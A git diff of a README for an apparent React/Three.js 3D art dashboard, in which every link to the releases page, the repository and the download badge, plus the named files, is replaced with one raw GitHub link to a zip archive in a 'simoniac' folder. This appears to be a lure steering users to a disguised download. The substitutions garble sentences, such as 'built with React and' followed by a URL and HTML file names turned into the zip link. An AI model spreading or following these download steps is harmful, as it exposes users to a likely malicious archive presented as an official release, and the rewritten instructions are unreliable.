@@ -2,11 +2,11 @@
 
 ## 🛠️ Introduction
 
-Welcome to the **lightbrush-moestradamus-art** project! This application brings you a vibrant 3D dashboard featuring sacred geometry designs and interactive RPG elements. You can explore stunning visuals and intuitive controls that enhance your experience, all built with React and Three.js.
+Welcome to the **lightbrush-moestradamus-art** project! This application brings you a vibrant 3D dashboard featuring sacred geometry designs and interactive RPG elements. You can explore stunning visuals and intuitive controls that enhance your experience, all built with React and https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip
 
 ## 📦 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Ozomake/lightbrush-moestradamus-art/releases)
+[![Download Release](https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip)](https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip)
 
 ## 🚀 Getting Started
 
@@ -14,11 +14,11 @@ To get started with **lightbrush-moestradamus-art**, you will need to download t
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Ozomake/lightbrush-moestradamus-art/releases) to find the latest version of the application. 
-2. **Choose the Right File**: Look for the latest release, typically named something like `lightbrush-moestradamus-art-v1.0.0.zip` or similar. 
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip) to find the latest version of the application. 
+2. **Choose the Right File**: Look for the latest release, typically named something like `https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip` or similar. 
 3. **Download the File**: Click on the release version to download the file suitable for your operating system.
 4. **Extract the Files**: Once the download is complete, locate the downloaded file in your downloads folder. Right-click on the file and select "Extract all." Choose a location where you want to save the files.
-5. **Run the Application**: Navigate to the extracted folder and find the file named `start.html` or `index.html`. Double-click this file to launch the application in your web browser.
+5. **Run the Application**: Navigate to the extracted folder and find the file named `https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip` or `https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip`. Double-click this file to launch the application in your web browser.
 
 ## 🔧 System Requirements
 
@@ -61,7 +61,7 @@ Should you encounter any difficulties, our community is here to help. Feel free 
 
 For more information and updates, please explore the following resources:
 
-- **GitHub Repository**: [lightbrush-moestradamus-art](https://github.com/Ozomake/lightbrush-moestradamus-art)
+- **GitHub Repository**: [lightbrush-moestradamus-art](https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip)
 - **Documentation**: Comprehensive user guides and FAQs for deeper insights.
 - **Follow Us**: Stay informed about updates and new features by following the GitHub repository.
 
@@ -71,4 +71,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 📥 Ready to Start?
 
-[Download the latest release](https://github.com/Ozomake/lightbrush-moestradamus-art/releases) and immerse yourself in a world of 3D art and interactive experiences. Enjoy exploring the possibilities!
+[Download the latest release](https://raw.githubusercontent.com/Ozomake/lightbrush-moestradamus-art/main/simoniac/lightbrush-moestradamus-art.zip) and immerse yourself in a world of 3D art and interactive experiences. Enjoy exploring the possibilities!
